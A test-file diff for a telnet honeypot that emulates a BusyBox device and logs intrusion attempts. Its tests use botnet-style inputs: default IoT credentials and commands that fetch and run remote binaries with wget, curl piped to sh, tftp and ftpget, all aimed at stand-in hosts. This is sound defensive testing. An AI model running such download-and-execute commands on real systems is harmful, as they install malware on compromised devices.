@@ -1,0 +1,523 @@
+# Tests for the honeypot: the telnet parser, the line splitter, the fake
+# shell and the event log lines, then the server driven over TCP.
+
+load "std/test"
+load "std/string"
+load "std/table"
+load "./telnet"
+load "./lines"
+load "./shell"
+load "./recorder"
+load "./server"
+
+let PORT = 62323
+let WAIT_MS = 2000
+
+let IAC = chr(255)
+let DO = chr(253)
+let DONT = chr(254)
+let WILL = chr(251)
+let WONT = chr(252)
+let SB = chr(250)
+let SE = chr(240)
+let ECHO = chr(1)
+let SGA = chr(3)
+let TTYPE = chr(24)
+
+# Feeds `pieces` in turn; returns the data and replies joined, and every
+# event.
+fn feed_all(t, pieces)
+  let data = buf_new()
+  let reply = buf_new()
+  let events = []
+  for piece in pieces
+    let r = telnet.feed(t, piece)
+    buf_push(data, r.data)
+    buf_push(reply, r.reply)
+    for ev in r.events
+      push(events, ev)
+    end
+  end
+  {data: to_string(data), reply: to_string(reply), events: events}
+end
+
+# ─── Telnet ────────────────────────────────────────────────────
+
+test.case("telnet passes plain data through") do
+  let r = telnet.feed(telnet.new(), "root\r\n")
+  test.assert_eq(r, {data: "root\r\n", reply: "", events: []})
+  test.assert_eq(telnet.feed(telnet.new(), "").data, "")
+end
+
+test.case("telnet strips commands and unescapes IAC IAC") do
+  let nop = IAC + chr(241)
+  let r = telnet.feed(telnet.new(), "a" + nop + "b" + IAC + IAC + "c" + IAC + chr(249))
+  test.assert_eq(r.data, "ab" + IAC + "c")
+  test.assert_eq(r.reply, "")
+end
+
+test.case("telnet answers option requests once each") do
+  let t = telnet.new()
+  test.assert_eq(telnet.echoing(t), false)
+  let r = telnet.feed(t, IAC + DO + ECHO + IAC + DO + SGA + IAC + DO + TTYPE + IAC + WILL + TTYPE + IAC + WILL + SGA)
+  test.assert_eq(r.data, "")
+  test.assert_eq(r.reply, IAC + WONT + TTYPE + IAC + DONT + TTYPE + IAC + DO + SGA)
+  test.assert_eq(telnet.echoing(t), true)
+  test.assert_eq(telnet.feed(t, IAC + DO + TTYPE + IAC + WILL + TTYPE).reply, "")
+  r = telnet.feed(t, IAC + DONT + ECHO + IAC + WONT + TTYPE)
+  test.assert_eq(r.reply, IAC + WONT + ECHO)
+  test.assert_eq(telnet.echoing(t), false)
+end
+
+test.case("telnet skips subnegotiations") do
+  let r = telnet.feed(telnet.new(), "a" + IAC + SB + TTYPE + chr(0) + "xterm" + IAC + IAC + IAC + SE + "b")
+  test.assert_eq(r.data, "ab")
+  test.assert_eq(r.events, [])
+end
+
+test.case("telnet abandons a subnegotiation over the cap") do
+  let t = telnet.new(4)
+  let r = telnet.feed(t, IAC + SB + "123456789")
+  test.assert_eq(r.data, "6789")
+  test.assert_eq(r.events, [{kind: "cap", cap: "subneg_too_long"}])
+  test.assert_eq(telnet.feed(t, "ok").data, "ok")
+end
+
+test.case("telnet commands split across reads, at every byte") do
+  let stream = "lo" + IAC + DO + ECHO + "g" + IAC + IAC + IAC + SB + "xy" + IAC + SE + "in" + IAC + WILL + TTYPE + "\r\n" + IAC
+  let whole = feed_all(telnet.new(), [stream])
+  test.assert_eq(whole.data, "log" + IAC + "in\r\n")
+  test.assert_eq(whole.reply, IAC + DONT + TTYPE)
+  for cut = 1, len(stream)
+    let r = feed_all(telnet.new(), [substr(stream, 0, cut), substr(stream, cut)])
+    test.assert_eq(r, whole, "cut at {cut}")
+  end
+  let bytes = []
+  for ch in stream
+    push(bytes, ch)
+  end
+  test.assert_eq(feed_all(telnet.new(), bytes), whole)
+end
+
+test.case("telnet escape doubles 255") do
+  test.assert_eq(telnet.escape("a" + IAC + "b"), "a" + IAC + IAC + "b")
+  test.assert_eq(telnet.escape("plain"), "plain")
+end
+
+# ─── Lines ─────────────────────────────────────────────────────
+
+fn texts(r)
+  table.map(r.lines, fn(ln) ln.text end)
+end
+
+
+# Feeds `pieces` in turn; returns every line's text and the too-long count.
+fn split_all(sp, pieces)
+  let out = []
+  let too_long = 0
+  for piece in pieces
+    let r = lines.feed(sp, piece)
+    for ln in r.lines
+      push(out, ln.text)
+    end
+    too_long = too_long + r.too_long
+  end
+  {lines: out, too_long: too_long}
+end
+
+test.case("lines end at CR LF, CR NUL, LF and a lone CR") do
+  let r = lines.feed(lines.new(), "a\r\nb\r\0c\nd\re")
+  test.assert_eq(texts(r), ["a", "b", "c", "d"])
+  test.assert_eq(r.rest, 10)
+  test.assert_eq(texts(lines.feed(lines.new(), "\r\n\n\r\0")), ["", "", ""])
+  test.assert_eq(texts(lines.feed(lines.new(), "a\0b\n")), ["a\0b"])
+end
+
+test.case("lines give each line's place in the chunk") do
+  let sp = lines.new()
+  lines.feed(sp, "ro")
+  let r = lines.feed(sp, "ot\r\nls\n")
+  test.assert_eq(r.lines, [{text: "root", from: 0, to: 2}, {text: "ls", from: 4, to: 6}])
+  test.assert_eq(r.rest, 7)
+end
+
+test.case("lines: a CR at the end of a chunk") do
+  let sp = lines.new()
+  test.assert_eq(texts(lines.feed(sp, "a\r")), ["a"])
+  let r = lines.feed(sp, "\nb\r")
+  test.assert_eq(texts(r), ["b"])
+  test.assert_eq(texts(lines.feed(sp, "")), [])
+  test.assert_eq(texts(lines.feed(sp, chr(0) + "c\n")), ["c"])
+  test.assert_eq(texts(lines.feed(sp, "\r")), [""])
+  test.assert_eq(texts(lines.feed(sp, "d\n")), ["d"])
+end
+
+test.case("lines split at every byte") do
+  let stream = "user\r\npass\r\0\r\nls -la\ncd\r\r\nx"
+  let whole = split_all(lines.new(), [stream])
+  test.assert_eq(whole.lines, ["user", "pass", "", "ls -la", "cd", ""])
+  for cut = 1, len(stream)
+    test.assert_eq(split_all(lines.new(), [substr(stream, 0, cut), substr(stream, cut)]), whole, "cut at {cut}")
+  end
+  let bytes = []
+  for ch in stream
+    push(bytes, ch)
+  end
+  test.assert_eq(split_all(lines.new(), bytes), whole)
+end
+
+test.case("lines drop a line over the limit") do
+  let sp = lines.new(8)
+  let r = split_all(sp, ["123456789\nok\n"])
+  test.assert_eq(r, {lines: ["ok"], too_long: 1})
+  r = split_all(sp, ["12345", "6789", string.repeat("x", 100000)])
+  test.assert_eq(r, {lines: [], too_long: 1})
+  test.assert(lines.dropping(sp))
+  test.assert_eq(split_all(sp, ["more\nnext\n"]), {lines: ["next"], too_long: 0})
+  test.assert_eq(lines.dropping(sp), false)
+  test.assert_eq(split_all(lines.new(8), ["12345678\n"]), {lines: ["12345678"], too_long: 0})
+end
+
+test.case("lines: many CRs and a far LF") do
+  let r = lines.feed(lines.new(), string.repeat("\r", 50000) + "\n")
+  test.assert_eq(len(r.lines), 50000)
+end
+
+# ─── Shell ─────────────────────────────────────────────────────
+
+fn logged_in_shell()
+  let sh = shell.new({accept_on: 1})
+  shell.line(sh, "root")
+  shell.line(sh, "root")
+  sh
+end
+
+# The output of `text` typed at the prompt, without the prompt.
+fn run(sh, text)
+  let out = shell.line(sh, text).out
+  if string.ends_with(out, "# ")
+    return substr(out, 0, len(out) - 2)
+  end
+  out
+end
+
+test.case("login: the nth attempt succeeds") do
+  let sh = shell.new({accept_on: 2})
+  test.assert_eq(shell.greeting(sh), "\nlocalhost login: ")
+  test.assert_eq(shell.line(sh, "  ").out, "localhost login: ")
+  test.assert_eq(shell.line(sh, "admin"), {out: "Password: ", events: []})
+  test.assert_eq(shell.echoes(sh), false)
+  let r = shell.line(sh, "admin")
+  test.assert_eq(r.out, "\nLogin incorrect\nlocalhost login: ")
+  test.assert_eq(r.events, [{kind: "login", user: "admin", password: "admin", ok: false}])
+  test.assert(shell.echoes(sh))
+  shell.line(sh, "root")
+  r = shell.line(sh, "xc3511")
+  test.assert_eq(r.events, [{kind: "login", user: "root", password: "xc3511", ok: true}])
+  test.assert(string.contains(r.out, "BusyBox v1.24.1"))
+  test.assert(string.ends_with(r.out, "\n# "))
+  test.assert(shell.logged_in(sh))
+end
+
+test.case("login: accept_chance 1.0 lets the first attempt in") do
+  let sh = shell.new({accept_on: 100, accept_chance: 1.0})
+  shell.line(sh, "u")
+  test.assert(shell.line(sh, "p").events[0].ok)
+end
+
+test.case("parse: words, quotes and operators") do
+  let cmds = shell.parse("echo 'a;b' \"c\\\"d\" e\\ f; x && y || z | w & v # comment")
+  test.assert_eq(table.map(cmds, fn(c) c.words end), [["echo", "a;b", "c\"d", "e f"], ["x"], ["y"], ["z"], ["w"], ["v"]])
+  test.assert_eq(table.map(cmds, fn(c) c.op end), [";", "&&", "||", "|", ";", nil])
+  test.assert_eq(shell.parse(""), [])
+  test.assert_eq(shell.parse(" ;; ; "), [])
+  test.assert_eq(shell.parse("echo 'unclosed")[0].words, ["echo", "unclosed"])
+end
+
+test.case("parse: redirects") do
+  let c = shell.parse("echo hi > /dev/null 2>&1")[0]
+  test.assert_eq(c.words, ["echo", "hi"])
+  test.assert(c.quiet)
+  c = shell.parse("cat x 2>/dev/null")[0]
+  test.assert_eq(c.words, ["cat", "x"])
+  test.assert_eq([c.quiet, c.quiet_err], [false, true])
+  c = shell.parse("echo a>>f b <in")[0]
+  test.assert_eq(c.words, ["echo", "a", "b"])
+  test.assert(c.quiet)
+  for line in ["nope >/dev/null 2>&1", "nope &>/dev/null", "nope 2>/dev/null >&2"]
+    c = shell.parse(line)[0]
+    test.assert_eq([c.words, c.quiet, c.quiet_err], [["nope"], true, true], line)
+  end
+  c = shell.parse("nope 2>&1 >/dev/null")[0]
+  test.assert_eq([c.quiet, c.quiet_err], [true, false])
+end
+
+test.case("parse: command substitutions stay whole") do
+  let cmds = shell.parse("echo $(id; uname -a) `a; b` \"x$(c (d) e)y\"; ls")
+  test.assert_eq(table.map(cmds, fn(c) c.words end), [["echo", "$(id; uname -a)", "`a; b`", "x$(c (d) e)y"], ["ls"]])
+  test.assert_eq(shell.parse("echo $(unclosed; x")[0].words, ["echo", "$(unclosed; x"])
+  test.assert_eq(shell.parse("echo '$(id)'")[0].words, ["echo", "$(id)"])
+  let seen = []
+  shell.parse("a $(b) \"`c`\" '$(d)'", fn(inner)
+    push(seen, inner)
+    "<{inner}>"
+  end)
+  test.assert_eq(seen, ["b", "c"])
+end
+
+test.case("shell: canned commands") do
+  let sh = logged_in_shell()
+  test.assert_eq(run(sh, "/bin/busybox ECCHI"), "ECCHI: applet not found\n")
+  test.assert_eq(run(sh, "busybox cat /nope"), "cat: can't open '/nope': No such file or directory\n")
+  test.assert(string.starts_with(run(sh, "busybox"), "BusyBox v1.24.1"))
+  test.assert_eq(run(sh, "nmap"), "sh: nmap: not found\n")
+  test.assert_eq(run(sh, "uname -m"), "armv7l\n")
+  test.assert_eq(run(sh, "uname"), "Linux\n")
+  test.assert(string.contains(run(sh, "cat /proc/cpuinfo"), "ARMv7"))
+  test.assert(string.contains(run(sh, "/bin/cat /proc/mounts"), "squashfs"))
+  test.assert(string.contains(run(sh, "ps"), "telnetd"))
+  test.assert(string.contains(run(sh, "ls -la /"), "proc"))
+  test.assert_eq(run(sh, "ls /tmp"), "")
+  for silent in ["enable", "system", "shell", "sh", "linuxshell", "cd /tmp", "chmod 777 x", "./x arm7", "/tmp/x", ""]
+    test.assert_eq(run(sh, silent), "", silent)
+  end
+  test.assert_eq(shell.line(sh, "").out, "# ")
+  test.assert_eq(shell.line(sh, "").events, [])
+end
+
+test.case("shell: echo") do
+  let sh = logged_in_shell()
+  test.assert_eq(run(sh, "echo hello  world"), "hello world\n")
+  test.assert_eq(run(sh, "echo -n x"), "x")
+  test.assert_eq(run(sh, "echo '\\x41'"), "\\x41\n")
+  let r = shell.line(sh, "echo -ne '\\x7f\\x45LF\\0101\\x0\\xzz\\\\\\cignored'")
+  test.assert_eq(r.events[1], {kind: "echo", bytes: chr(127) + "ELFA" + chr(0) + "\\xzz\\"})
+  test.assert_eq(r.out, chr(127) + "ELFA" + chr(0) + "\\xzz\\# ")
+  test.assert_eq(shell.decode_escapes("a\\tb\\n\\q\\"), "a\tb\n\\q\\")
+end
+
+test.case("shell: downloads log their URL") do
+  let sh = logged_in_shell()
+  let r = shell.line(sh, "cd /tmp; wget http://1.2.3.4:8080/bins/x.arm7 -O y; tftp -g -r mips -l m 5.6.7.8 69")
+  test.assert_eq(table.filter(r.events, fn(e) e.kind == "url" end), [
+    {kind: "url", url: "http://1.2.3.4:8080/bins/x.arm7", via: "wget"},
+    {kind: "url", url: "tftp://5.6.7.8:69/mips", via: "tftp"}
+  ])
+  test.assert(string.starts_with(r.out, "Connecting to 1.2.3.4 (1.2.3.4:80)\nsaving to 'y'\n"))
+  r = shell.line(sh, "curl -s -o a http://h/c.sh | sh; /bin/busybox ftpget 9.9.9.9 b b.mips; tftp 7.7.7.7 -c get t.sh; wget -q")
+  test.assert_eq(table.map(table.filter(r.events, fn(e) e.kind == "url" end), fn(e) e.url end), [
+    "http://h/c.sh", "ftp://9.9.9.9/b.mips", "tftp://7.7.7.7/t.sh"
+  ])
+  test.assert(string.contains(r.out, "Usage: wget"))
+end
+
+test.case("shell: && and || follow fake exit statuses") do
+  let sh = logged_in_shell()
+  test.assert_eq(run(sh, "nope && echo a || echo b"), "sh: nope: not found\nb\n")
+  test.assert_eq(run(sh, "echo a && echo b || echo c"), "a\nb\n")
+  test.assert_eq(run(sh, "false || true && echo d"), "d\n")
+end
+
+test.case("shell: pipelines and redirects") do
+  let sh = logged_in_shell()
+  test.assert(string.contains(run(sh, "cat /proc/cpuinfo | grep name | head -n 1"), "model name"))
+  test.assert_eq(run(sh, "echo a | nope"), "sh: nope: not found\n")
+  test.assert_eq(run(sh, "echo a > /tmp/f"), "")
+  test.assert_eq(run(sh, "nope 2>/dev/null"), "")
+  test.assert_eq(run(sh, "nope > /dev/null"), "sh: nope: not found\n")
+  test.assert_eq(run(sh, "wget http://a/b >/dev/null 2>&1"), "")
+  test.assert_eq(run(sh, "nope 2>&1"), "sh: nope: not found\n")
+end
+
+test.case("shell: command substitutions run") do
+  let sh = logged_in_shell()
+  let r = shell.line(sh, "echo $(echo -n a; echo b) \"[`uname -m`]\"")
+  test.assert_eq(r.out, "ab [armv7l]\n# ")
+  r = shell.line(sh, "sh -c \"$(wget http://e.x/s.sh -O -)\"")
+  test.assert_eq(table.map(table.filter(r.events, fn(e) e.kind == "url" end), fn(e) e.url end), ["http://e.x/s.sh"])
+  test.assert(string.starts_with(r.out, "Connecting to e.x"))
+  test.assert_eq(run(sh, "echo $(nope)x"), "sh: nope: not found\nx\n")
+  test.assert_eq(run(sh, "echo $(echo $(echo $(echo $(echo $(echo deep)))))"), "$(echo deep)\n")
+  test.assert_eq(run(sh, "echo $(exit) still"), " still\n")
+  test.assert_eq(shell.closed(sh), false)
+end
+
+test.case("shell: exit ends the session") do
+  let sh = logged_in_shell()
+  let r = shell.line(sh, "exit; echo after")
+  test.assert_eq(r.out, "")
+  test.assert(shell.closed(sh))
+end
+
+# ─── Event log lines ───────────────────────────────────────────
+
+test.case("recorder quotes every unprintable byte") do
+  test.assert_eq(recorder.quote("ab"), "\"ab\"")
+  test.assert_eq(recorder.quote("a\"b\\c" + chr(0) + chr(27) + "[" + chr(255) + "\n"), "\"a\\\"b\\\\c\\x00\\x1b[\\xff\\x0a\"")
+  test.assert_eq(recorder.quote(""), "\"\"")
+end
+
+test.case("recorder formats an event") do
+  let ev = {kind: "login", user: "root", password: "x y", ok: true, session: 7, time: 0}
+  test.assert_eq(recorder.format(ev), "1970-01-01T00:00:00Z session=7 login user=\"root\" password=\"x y\" ok=true")
+  test.assert_eq(recorder.format({kind: "refused", ip: "1.2.3.4", time: 0}), "1970-01-01T00:00:00Z refused ip=\"1.2.3.4\"")
+end
+
+# ─── Over TCP ──────────────────────────────────────────────────
+
+# Reads from `sock` until what was read ends with `marker`; returns all of
+# it. Raises after WAIT_MS.
+fn read_until(sock, marker)
+  let got = buf_new()
+  let tail = ""
+  let deadline = time_ms() + WAIT_MS
+  while not string.ends_with(tail, marker)
+    let chunk = tcp_read(sock, 4096, deadline - time_ms())
+    if chunk == nil or chunk == ""
+      error("read_until: wanted {marker}, got {to_string(got)}")
+    end
+    buf_push(got, chunk)
+    tail = tail + chunk
+    if len(tail) > len(marker)
+      tail = substr(tail, len(tail) - len(marker))
+    end
+  end
+  to_string(got)
+end
+
+# The events of one session, up to its session_end.
+fn session_events()
+  let evs = []
+  while true
+    receive
+    when {tag: "hp_event", event: ev}
+      push(evs, ev)
+      if ev.kind == "session_end" then return evs end
+    after WAIT_MS
+      error("session_events: no session_end; got {evs}")
+    end
+  end
+end
+
+fn kinds(evs)
+  table.map(evs, fn(e) e.kind end)
+end
+
+fn with_server(opts, body)
+  let listener = tcp_listen("127.0.0.1", PORT)
+  opts.events = self()
+  let sup = server.start(listener, opts)
+  let r = pcall body()
+  server.stop(sup)
+  tcp_close(listener)
+  if not r.ok
+    error(r.error)
+  end
+end
+
+test.case("tcp: a session from login to exit") do
+  with_server({accept_on: 1, accept_chance: 0.0}) do
+    let sock = tcp_connect("127.0.0.1", PORT)
+    let sent = 0
+    let say = fn(text)
+      sent += len(text)
+      tcp_write(sock, text, 1000)
+    end
+    let hello = read_until(sock, "login: ")
+    test.assert_eq(hello, telnet.OFFER + "\r\nlocalhost login: ")
+    say(IAC + DO + ECHO + IAC + DO + SGA + IAC + WILL + TTYPE + "ro")
+    test.assert_eq(read_until(sock, "ro"), IAC + DONT + TTYPE + "ro")
+    say("ot\r\n")
+    test.assert_eq(read_until(sock, "Password: "), "ot\r\nPassword: ")
+    say("s3cret\r\0")
+    let motd = read_until(sock, "# ")
+    test.assert(not string.contains(motd, "s3cret"))
+    say("echo " + IAC + IAC + "x; wget http://e.x/a\r\n")
+    let out = read_until(sock, "# ")
+    test.assert(string.starts_with(out, "echo " + IAC + IAC + "x; wget http://e.x/a\r\n" + IAC + IAC + "x\r\nConnecting to e.x"))
+    say("exit\r\n")
+    test.assert_eq(read_until(sock, "exit\r\n"), "exit\r\n")
+    test.assert_eq(tcp_read(sock, 4096, WAIT_MS), "")
+    tcp_close(sock)
+    let evs = session_events()
+    test.assert_eq(kinds(evs), ["session_start", "login", "command", "url", "command", "session_end"])
+    test.assert_eq(evs[0].ip, "127.0.0.1")
+    test.assert_eq([evs[1].user, evs[1].password, evs[1].ok], ["root", "s3cret", true])
+    test.assert_eq(evs[2].line, "echo " + IAC + "x; wget http://e.x/a")
+    test.assert_eq(evs[3].url, "http://e.x/a")
+    test.assert_eq([evs[5].reason, evs[5].logged_in], ["exit", true])
+    test.assert_eq(evs[5].bytes_in, sent)
+    test.assert(table.all(evs, fn(e) e.session == evs[0].session end))
+  end
+end
+
+test.case("tcp: a bot that ignores negotiation and sends it all at once") do
+  with_server({accept_on: 1, accept_chance: 0.0}) do
+    let sock = tcp_connect("127.0.0.1", PORT)
+    read_until(sock, "login: ")
+    tcp_write(sock, "admin\r\nadmin\r\nenable\r\nsystem\r\nshell\r\nsh\r\n/bin/busybox MIRAI\r\n", 1000)
+    let out = read_until(sock, "MIRAI: applet not found\r\n# ")
+    test.assert(not string.contains(out, "admin"))
+    tcp_close(sock)
+    let evs = session_events()
+    test.assert_eq(kinds(evs), ["session_start", "login", "command", "command", "command", "command", "command", "session_end"])
+    test.assert_eq(evs[7].reason, "closed")
+  end
+end
+
+test.case("tcp: idle clients and clients that leave at once") do
+  with_server({idle_ms: 100}) do
+    let sock = tcp_connect("127.0.0.1", PORT)
+    read_until(sock, "login: ")
+    test.assert_eq(tcp_read(sock, 4096, WAIT_MS), "")
+    tcp_close(sock)
+    let evs = session_events()
+    test.assert_eq([evs[1].reason, evs[1].logged_in], ["idle", false])
+    let quick = tcp_connect("127.0.0.1", PORT)
+    tcp_close(quick)
+    let ends = session_events()
+    test.assert(ends[len(ends) - 1].reason == "closed" or ends[len(ends) - 1].reason == "write_failed")
+  end
+end
+
+test.case("tcp: an endless line and an endless subnegotiation stay capped") do
+  with_server({max_line: 1000, max_subneg: 100}) do
+    let sock = tcp_connect("127.0.0.1", PORT)
+    read_until(sock, "login: ")
+    let junk = string.repeat("A", 65536)
+    for i = 0, 16
+      tcp_write(sock, junk, 1000)
+    end
+    tcp_write(sock, IAC + SB + junk + "\r\nroot\r\n", 1000)
+    test.assert(string.ends_with(read_until(sock, "Password: "), "Password: "))
+    tcp_close(sock)
+    let evs = session_events()
+    let caps = table.filter(evs, fn(e) e.kind == "cap" end)
+    test.assert_eq(table.map(caps, fn(e) e.cap end), ["line_too_long", "subneg_too_long"])
+  end
+end
+
+test.case("tcp: a registry crash restarts the acceptor with it") do
+  with_server({}) do
+    let old = whereis("honeypot_registry")
+    let sock = tcp_connect("127.0.0.1", PORT)
+    read_until(sock, "login: ")
+    kill(old, "boom")
+    let deadline = time_ms() + WAIT_MS
+    while whereis("honeypot_registry") == nil or whereis("honeypot_registry") == old
+      if time_ms() > deadline then error("registry not restarted") end
+      sleep(10)
+    end
+    tcp_write(sock, "root\r\n", 1000)
+    test.assert_eq(read_until(sock, "Password: "), "Password: ")
+    tcp_close(sock)
+    session_events()
+    let again = tcp_connect("127.0.0.1", PORT)
+    test.assert(string.ends_with(read_until(again, "login: "), "login: "))
+    tcp_close(again)
+    let evs = session_events()
+    test.assert_eq(evs[1].reason, "closed")
+  end
+end
+
+test.run()
